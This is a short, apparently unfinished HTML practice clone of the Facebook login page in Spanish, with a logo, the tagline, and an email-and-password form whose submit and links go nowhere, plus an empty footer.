<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

<body>
    <main class="principal ">
        <section class="contenedor contenedor-flex estaticos-principal">
            
            <div class="presentacion">
                <img src="img/logo.svg" alt="logo">
                <h2>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
            </div>
            
            <div class="contenedor__formulario estaticos">
                <form class="fondo__formulario ">
                    <input class="etiqueta" type="email" placeholder="Correo electronico o numero de telefono">
                    <input class="etiqueta" type="password" placeholder= "Contraseña">
                    <input class="boton boton-1" type="submit" value="Iniciar Sesion">
                    <a class="boton-2" href="#">¿Olvidaste tu contraseña?</a>
                    <div class="linea"></div>
                    <a class="boton boton-3" href="#">Crear cuenta nueva</a>
                </form>
                <div class="contenedor__formulario">
                    <p><b>Crea una pagina</b> para una celebridad, una marca o un negocio</p>
                </div>
            </div>
        </section>
    </main>
    <footer>

    </footer>
